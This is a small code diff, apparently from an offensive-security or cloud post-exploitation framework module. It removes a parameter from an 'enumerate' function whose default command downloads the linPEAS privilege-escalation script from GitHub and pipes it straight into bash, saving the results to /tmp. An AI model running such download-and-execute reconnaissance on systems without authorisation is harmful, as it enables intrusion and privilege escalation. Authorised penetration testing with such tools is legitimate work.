@@ -94,7 +94,7 @@ class Module(BaseModule):
                 prep_local_env(csp=csp, task_name=task_name)
                 session.log("prep_local_env complete")
 
-            def enumerate(csp, command="curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information | tee /tmp/linpeas.txt"):
+            def enumerate(command="curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information | tee /tmp/linpeas.txt"):
                 # create a wait and retry payload
                 payload = retry_command(command=command)
 
